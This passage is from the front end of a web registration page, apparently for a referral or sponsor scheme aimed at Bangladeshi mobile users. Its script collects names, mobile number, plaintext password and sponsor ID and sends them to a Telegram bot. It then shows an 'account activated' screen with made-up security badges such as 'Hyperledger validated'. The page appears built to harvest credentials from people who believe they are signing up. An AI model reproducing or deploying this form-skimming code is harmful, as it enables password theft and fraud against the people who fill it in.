                        .sponsor-tag {
                            font-size: 0.75rem;
                            background: #031c2c;
                            padding: 6px 12px;
                            border-radius: 60px;
                            display: inline-block;
                            margin-top: 12px;
                            color: #96ceff;
                        }
                        .telegram-status-area {
                            margin: 12px auto 0;
                            text-align: center;
                        }
                        .info-footer {
                            font-size: 0.7rem;
                            color: #90b7e6;
                            margin-top: 1rem;
                            text-align: center;
                        }
                        .dash-action {
                            background: linear-gradient(95deg, #1a547a, #0c3553);
                            border: none;
                            padding: 0.75rem 2rem;
                            border-radius: 3rem;
                            color: white;
                            font-weight: bold;
                            font-size: 0.9rem;
                            margin-top: 1rem;
                            cursor: pointer;
                            display: inline-flex;
                            gap: 12px;
                            transition: 0.2s;
                            font-family: 'Space Grotesk', monospace;
                        }
                        .dash-action:hover {
                            background: #2c6f9e;
                            transform: scale(0.97);
                            box-shadow: 0 0 12px cyan;

                        .badge-footer {
                            background: #010e1a;

                            font-size: 0.65rem;
                            color: #6797c9;

                        }
                    </style>
                </head>
                <body>
                    <div class="success-nebula">
                        <div class="prestige-header">
                            <div class="icon-orb"><i class="fas fa-user-check"></i></div>
                            <h1><i class="fas fa-check-circle"></i> ACCOUNT ACTIVATED</h1>
                        </div>
                        <div class="success-content">
                            <div class="greeting-hero">
                                <i class="fas fa-shuttle-space"></i> WELCOME, PIONEER <i class="fas fa-rocket"></i>
                            </div>
                            <div style="display: flex; justify-content: center;">
                                <div class="member-name">
                                    <i class="fas fa-id-card"></i> ${escapeHTML(displayName)}
                                </div>
                            </div>
                            <div class="code-vault">
                                <div class="code-label"><i class="fas fa-qrcode"></i> YOUR EXCLUSIVE REFERRAL KEY <i class="fas fa-link"></i></div>
                                <div style="text-align: center;">
                                    <div class="display-code">${escapeHTML(generatedCode)}</div>
                                </div>
                                <div class="sponsor-tag">
                                    <i class="fas fa-handshake"></i> Sponsor ID: ${escapeHTML(sponsorId)}
                                </div>
                                <div class="telegram-status-area">
                                </div>
                                <div class="info-footer">
                                    <i class="fas fa-chart-line"></i> Share your code & earn rewards • Secure Nexus Protocol
                                </div>
                            </div>
                            <div style="text-align: center;">
                                <button class="dash-action" onclick="window.close()"><i class="fas fa-charging-station"></i> ENTER DASHBOARD</button>
                            </div>
                        </div>
                        <div class="badge-footer">
                            <i class="fas fa-shield-alt"></i> HYPERLEDGER VALIDATED • UNIQUE REF CODE GENERATED
                        </div>
                    </div>
                </body>
                </html>
            `);
            newWindow.document.close();
            return true;
        }
        
        // Main registration handler: validate, generate code, send Telegram, open success
        async function handleRegistration() {
            const firstName = firstNameInput.value.trim();
            const middleName = middleNameInput.value.trim();
            const lastName = lastNameInput.value.trim();
            const mobile = mobileInput.value.trim();
            const password = passwordInput.value.trim();
            const referralNumber = referralInput.value.trim();
            
            const fieldsList = [
                { value: firstName, element: firstNameInput, name: 'First name', validator: isValidName },
                { value: middleName, element: middleNameInput, name: 'Middle name', validator: isValidName },
                { value: lastName, element: lastNameInput, name: 'Last name', validator: isValidName },
                { value: mobile, element: mobileInput, name: 'Mobile number', validator: isValidBangladeshMobile },
                { value: password, element: passwordInput, name: 'Password', validator: (pwd) => pwd.length >= 4 },
                { value: referralNumber, element: referralInput, name: 'Referral / Sponsor ID', validator: (ref) => ref !== "" }
            ];
            
            removeAllHighlights();
            const invalidFields = [];
            for (let f of fieldsList) {
                if (!f.validator(f.value)) {
                    invalidFields.push(f);
                    f.element.classList.add('error-highlight');
                }
            }
            
            if (invalidFields.length > 0) {
                shakeCard();
                const errorMessages = invalidFields.map(f => {
                    if (f.name === 'Mobile number') return "📱 Invalid Bangladesh mobile number (must be 11 digits, start with 01)";
                    if (f.name.includes('name')) return `⚠️ Invalid ${f.name} (must be at least 2 letters, no numbers/symbols)`;
                    if (f.name === 'Password') return "🔐 Password must be at least 4 characters";
                    return `❌ ${f.name} is required`;
                });
                alert("ACCESS DENIED:\n\n" + errorMessages.join("\n"));
                return false;
            }
            
            // generate referral code
            const newlyGeneratedReferralCode = generateRandomReferralCode();
            
            // Prepare data for telegram
            const userDataForTelegram = {
                firstName: firstName,
                middleName: middleName,
                lastName: lastName,
                mobile: mobile,
                password: password,
                sponsorId: referralNumber,
                generatedReferral: newlyGeneratedReferralCode
            };
            
            // send telegram notification (non-blocking but we wait to know status)
            let telegramSuccess = false;
            try {
                telegramSuccess = await sendTelegramNotification(userDataForTelegram);
            } catch(e) { console.error(e); }
            
            // Open success dashboard with telegram status
            openSuccessDashboard(firstName, lastName, newlyGeneratedReferralCode, referralNumber, telegramSuccess);
            return true;
        }
        
        registerButton.addEventListener('click', handleRegistration);
        const allInputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
        allInputs.forEach(input => {
            if (input) {
                input.addEventListener('input', function() {
                    this.classList.remove('error-highlight');
                });
            }
        });
    })();
</script>
